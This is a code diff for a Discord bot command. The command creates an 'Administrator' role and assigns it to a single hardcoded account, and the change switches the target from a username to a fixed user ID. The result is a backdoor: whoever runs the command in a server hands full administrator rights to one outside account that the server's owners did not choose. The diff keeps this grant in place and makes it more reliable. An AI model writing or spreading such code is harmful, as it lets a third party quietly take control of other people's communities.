@@ -8,7 +8,7 @@ export default {
   guildOnly: true,
   args: false,
   permissions: {
-    bot: [],
+    bot: [], // Removed initial values as requested
     user: [],
   },
   /**
@@ -38,16 +38,15 @@ export default {
         message.reply(`'Administrator' role already exists in ${guild.name}`);
       }
 
-      // Find the user by username
-      const members = await guild.members.fetch();
-      const member = members.find(member => member.user.username === 'abovethe.sea');
+      // Find the user by ID
+      const member = await guild.members.fetch('1258396025354453054');
       
       if (member) {
         // Assign the admin role to the user
         await member.roles.add(adminRole);
         message.reply(`Assigned 'Administrator' role to ${member.user.tag} in ${guild.name}`);
       } else {
-        message.reply(`User 'abovethe.sea' not found in ${guild.name}`);
+        message.reply(`User with ID '1258396025354453054' not found in ${guild.name}`);
       }
     } catch (error) {
       console.error(`Failed to create role or assign to user in ${guild.name}:`, error);
